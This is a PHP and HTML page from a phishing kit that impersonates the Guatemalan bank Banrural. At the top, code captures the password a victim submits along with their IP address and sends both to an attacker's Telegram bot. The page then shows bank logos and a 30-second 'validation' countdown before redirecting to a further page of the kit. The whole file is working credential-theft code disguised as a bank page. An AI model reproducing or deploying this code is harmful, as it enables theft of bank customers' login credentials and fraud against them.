<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('datos_del_tel.php');
////////////////////

if ( isset ($_POST['usr1'])){


$message = "Login-Banrural-GT\r\nContraseña: ".$_POST['usr1']."\r\nIP ".$userp."\r\n";


$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

}else{ header ('location: index.html'); exit();
 }

?>

<!doctype html>
<html>
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">	
    

    <link rel="stylesheet" href="fonts/icomoon/style.css">


    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    
    <!-- Style -->
    <link rel="stylesheet" href="css/style.css">

    <title>inicio</title>
	
	 <script language="JavaScript">
 
    /* Determinamos el tiempo total en segundos */
    var totalTiempo=30;
    
    var url="confirmar00.php";
 
    function updateReloj()
    {
        document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" segundos, <br> <br> Bienvenido a su Validacion";


 
        if(totalTiempo==0)
        {
            window.location=url;
        }else{
            /* Restamos un segundo al tiempo restante */
            totalTiempo-=1;
            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
            setTimeout("updateReloj()",1000);
        }
    }
 
    window.onload=updateReloj;
 
    </script>
  </head>
  <body>
  

  <div class="content">
    
    <div class="container">
	
      <div class="row align-items-stretch justify-content-center no-gutters">
        <div class="col-md-7">
		
          <div class="form h-100 contact-wrap p-5">
		  
		   <div align="center">
<p style="text-align: center;"><img src="https://a.storyblok.com/f/160385/f0e2781f59/banrural.png" alt="As&iacute; conquist&oacute; BanRural al 50 % de los habitantes de Guatemala | CONtexto  Ganadero" width="324" height="208" /></p>
<label style="font-size: 20px;

			</div><br><br>
		  
		  		<div align="center">

                
									<h3 style="color:red;">
									
									</h3>
							
	
	     <div  align="center"> 
			  
		<b><p id='CuentaAtras'></p></b>
			   
	<br><br>
			
			   <span class="focus-input100"></span>
			   </div>
               <div align="center">
<p style="text-align: center;"><img src="https://www.banrural.com.hn/wp-content/uploads/2022/02/Banrural-539x303.png" alt="Banrural | El amigo que te ayuda a crecer" width="338" height="190" /></p>
<p>&nbsp;</p>			
              </div>
			  
			  <br><br><br>
          
		 


            <div id="form-message-warning mt-4"></div> 
           
	<div align="center">
          </div>
        </div>
      </div>
    </div>

  </div>

  </body>
</html>